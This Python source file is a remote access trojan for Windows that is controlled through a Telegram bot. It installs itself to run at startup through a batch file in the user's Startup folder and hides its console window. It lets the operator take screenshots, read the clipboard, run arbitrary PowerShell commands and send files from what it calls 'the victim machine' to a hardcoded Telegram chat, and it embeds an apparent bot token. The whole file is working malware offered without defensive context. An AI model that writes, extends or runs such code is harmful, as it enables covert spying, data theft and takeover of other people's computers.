import pyautogui
import os
import pyperclip
import subprocess
import shutil
import getpass
import ctypes
from telegram import InlineKeyboardButton, InlineKeyboardMarkup, ParseMode
from telegram.ext import Application, CommandHandler, CallbackQueryHandler, ContextTypes

# Configuration
config = {
    "apiKey": "7456059922:AAHPG-OTxBSLoslySTwnCdVC49V95wQYyAk",  
    "chatID": "1059393984",  
}

# Add startup script
def setup_startup():
    USER_NAME = getpass.getuser()
    bat_path = os.path.join(
        r"C:\Users", USER_NAME, "AppData", "Roaming", "Microsoft", "Windows", "Start Menu", "Programs", "Startup"
    )
    startUpFile = os.path.join(bat_path, "open.bat")

    if not os.path.exists(startUpFile):
        # Create a batch file to start the script on Windows startup
        with open(startUpFile, "w") as bat_file:
            bat_file.write(f'start "" "{os.path.abspath(__file__)}"')

    # Hide console window
    ctypes.windll.user32.ShowWindow(ctypes.windll.kernel32.GetConsoleWindow(), 0)

# Initialize Telegram bot
async def start(update, context: ContextTypes.DEFAULT_TYPE) -> None:
    keyboard = [
        [InlineKeyboardButton("Screenshot", callback_data="get_Screenshot")],
        [InlineKeyboardButton("Commands", callback_data="shell_commands")],
        [InlineKeyboardButton("File", callback_data="get_file")],
        [InlineKeyboardButton("Clipboard", callback_data="get_clipboard")],
    ]
    reply_markup = InlineKeyboardMarkup(keyboard)
    await update.message.reply_text("Available Commands:", reply_markup=reply_markup)

async def screen_shot() -> None:
    """Take a screenshot and save it to disk."""
    screenshot = pyautogui.screenshot()
    screenshot_path = "screenshot.png"
    screenshot.save(screenshot_path)
    return screenshot_path

async def get_clipboard() -> str:
    """Retrieve the clipboard content."""
    return pyperclip.paste()

async def shell_commands(update, context: ContextTypes.DEFAULT_TYPE) -> None:
    """Execute a shell command and send the result."""
    command = ' '.join(context.args)
    if command:
        result = subprocess.run(
            f"powershell.exe {command}", stdout=subprocess.PIPE, shell=True
        )
        result_text = result.stdout.decode()
        await context.bot.send_message(chat_id=config["chatID"], text=f"Result:\n{result_text}")
    else:
        await context.bot.send_message(chat_id=config["chatID"], text="Command is not valid.")

async def get_file(update, context: ContextTypes.DEFAULT_TYPE) -> None:
    """Send a file from the victim machine."""
    file_path = ' '.join(context.args)
    if os.path.exists(file_path):
        with open(file_path, 'rb') as file:
            await context.bot.send_document(chat_id=config["chatID"], document=file)
    else:
        await context.bot.send_message(chat_id=config["chatID"], text="The file does not exist!")

async def button(update, context: ContextTypes.DEFAULT_TYPE) -> None:
    """Handle button clicks from the Telegram bot."""
    query = update.callback_query
    await query.answer()
    result = query.data

    if result == "get_Screenshot":
        screenshot_path = await screen_shot()
        with open(screenshot_path, "rb") as photo:
            await context.bot.send_photo(chat_id=config["chatID"], photo=photo, caption="Screenshot")
        os.remove(screenshot_path)  # Clean up
    elif result == "shell_commands":
        await context.bot.send_message(chat_id=config["chatID"], text="Write /shell [command]")
    elif result == "get_file":
        await context.bot.send_message(chat_id=config["chatID"], text="/file [file path]")
    elif result == "get_clipboard":
        clipboard_content = await get_clipboard()
        await context.bot.send_message(chat_id=config["chatID"], text=f"Clipboard content:\n{clipboard_content}")
    else:
        await context.bot.send_message(chat_id=config["chatID"], text="No option exists.")

async def main() -> None:
    setup_startup()  # Set up the script to run on startup

    application = Application.builder().token(config["apiKey"]).build()

    application.add_handler(CommandHandler("start", start))
    application.add_handler(CommandHandler("shell", shell_commands))
    application.add_handler(CommandHandler("file", get_file))
    application.add_handler(CallbackQueryHandler(button))

    await application.run_polling()

if __name__ == '__main__':
    import asyncio
    asyncio.run(main())
